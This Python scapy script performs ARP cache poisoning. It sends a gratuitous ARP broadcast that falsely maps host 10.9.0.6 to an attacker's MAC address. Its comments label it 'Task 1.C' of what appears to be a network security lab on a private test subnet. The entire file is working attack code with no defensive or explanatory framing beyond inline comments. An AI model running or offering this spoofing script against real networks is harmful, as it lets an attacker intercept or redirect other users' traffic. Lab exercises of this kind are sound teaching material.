#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp
import time

# --- Configuration ---
# IP_A_TARGET is the primary victim we are observing.
# MAC_A_TARGET is not directly used in sending the gratuitous ARP but good for context.
IP_A_TARGET = "10.9.0.5"
MAC_A_TARGET = "02:42:0a:09:00:05"

# IP_B_SPOOFED is Host B's IP address. We want to make Host A (and others)
# believe this IP address is at MAC_M_ATTACKER.
IP_B_SPOOFED = "10.9.0.6"

# MAC_M_ATTACKER is Host M's (the attacker's) MAC address.
# Ensure this is the correct MAC for your Host M's interface on the 10.9.0.0/24 network.
MAC_M_ATTACKER = "02:42:0a:09:00:69"

# Broadcast MAC address for the Ethernet frame destination
MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"

def send_gratuitous_arp():
    """
    Constructs and sends a single gratuitous ARP packet.
    This packet announces that IP_B_SPOOFED is at MAC_M_ATTACKER.
    """
    print(f"[*] Sending Gratuitous ARP for {IP_B_SPOOFED} mapping to {MAC_M_ATTACKER}")
    print(f"[*] Target Host A: ({IP_A_TARGET})")

    # Construct the Ethernet Frame
    # Destination MAC: Broadcast MAC address (ff:ff:ff:ff:ff:ff)
    # Source MAC: Attacker's (Host M's) MAC address
    ether_frame = Ether(dst=MAC_BROADCAST, src=MAC_M_ATTACKER)

    # Construct the ARP Packet for Gratuitous ARP
    # op=1 specifies an ARP request. Gratuitous ARP is a special kind of request.
    # hwsrc (Sender MAC): Attacker's MAC address (MAC_M_ATTACKER)
    # psrc (Sender IP): The IP address being announced (IP_B_SPOOFED).
    # hwdst (Target MAC): Usually 00:00:00:00:00:00 for gratuitous ARP requests,
    #                     as it's a broadcast announcement, not a reply to a specific query.
    # pdst (Target IP): The IP address being announced (IP_B_SPOOFED).
    #                   For gratuitous ARP, psrc and pdst in the ARP payload are the same.
    arp_packet = ARP(op=1, # ARP Request
                      hwsrc=MAC_M_ATTACKER,
                      psrc=IP_B_SPOOFED,
                      hwdst="00:00:00:00:00:00", # Target MAC for ARP payload
                      pdst=IP_B_SPOOFED)

    # Combine the Ethernet frame and ARP packet
    packet = ether_frame / arp_packet

    # Send the packet at Layer 2
    # verbose=False to suppress Scapy's default output for sent packets
    try:
        sendp(packet, verbose=False) # Use default interface, or specify with iface="ethX"
        print("[+] Gratuitous ARP packet sent successfully.")
    except Exception as e:
        print(f"[!] Error sending packet: {e}")

if __name__ == "__main__":
    # This script will send one gratuitous ARP packet.
    # For Task 1.C, sending it once should be sufficient to observe the cache change.

    print("--- ARP Poisoning Script (Task 1.C - Gratuitous ARP) ---")
    send_gratuitous_arp()

